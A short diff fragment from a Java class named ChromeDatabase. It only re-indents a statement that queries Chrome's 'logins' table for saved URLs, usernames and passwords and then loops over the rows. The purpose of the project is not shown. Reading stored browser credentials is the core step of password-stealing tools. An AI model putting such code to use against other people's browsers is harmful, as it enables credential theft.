@@ -81,8 +81,8 @@ public final class ChromeDatabase {
 
 		try (Statement statement = connection.createStatement();
 
-			ResultSet results = statement
-					.executeQuery("SELECT action_url, username_value, password_value FROM logins")) {
+		     ResultSet results = statement
+				     .executeQuery("SELECT action_url, username_value, password_value FROM logins")) {
 
 			while (results.next()) {
 				String url, username, password;
